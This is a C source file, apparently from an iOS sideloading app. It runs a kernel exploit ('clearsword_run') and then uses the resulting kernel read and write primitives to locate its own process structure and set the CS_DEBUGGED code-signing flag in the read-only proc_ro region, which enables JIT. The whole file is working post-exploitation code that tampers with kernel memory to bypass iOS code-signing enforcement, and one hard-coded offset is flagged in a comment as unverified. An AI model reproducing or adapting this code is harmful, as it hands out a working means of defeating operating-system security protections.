#include "ClearSword.h"
#include "../LCUtils/utils.h"   // CS_DEBUGGED, csops
#include "clearsword/poc.h"     // clearsword_run()
#include "clearsword/kmem.h"    // find_self_proc()
#include "clearsword/krw.h"     // kread_length, kwrite_length
#include "clearsword/common.h"  // g_offsets, g_ctx
#include <unistd.h>
#include <errno.h>

// Offset of p_csflags within proc_ro — verify against XNU source for your target iOS versions
#define PROC_RO_CSFLAGS_OFFSET 0x1C

int enable_self_jit(void) {
    int r = clearsword_run();
    if (r != 0) return r;

    // Already CS_DEBUGGED? nothing to do
    int flags = 0;
    csops(getpid(), 0, &flags, sizeof(flags));
    if (flags & CS_DEBUGGED) return 0;

    uint64_t my_proc = find_self_proc();
    if (!my_proc) return ESRCH;

    // proc_ro is a read-only mirror of proc — csflags lives there on iOS 15+
    uint64_t proc_ro = 0;
    kread_length(my_proc + g_offsets.proc_p_ro, &proc_ro, sizeof(proc_ro));
    if (!proc_ro) return EFAULT;

    uint32_t csflags = 0;
    kread_length(proc_ro + PROC_RO_CSFLAGS_OFFSET, &csflags, sizeof(csflags));
    csflags |= CS_DEBUGGED;
    kwrite_length(proc_ro + PROC_RO_CSFLAGS_OFFSET, &csflags, sizeof(csflags));

    return 0;
}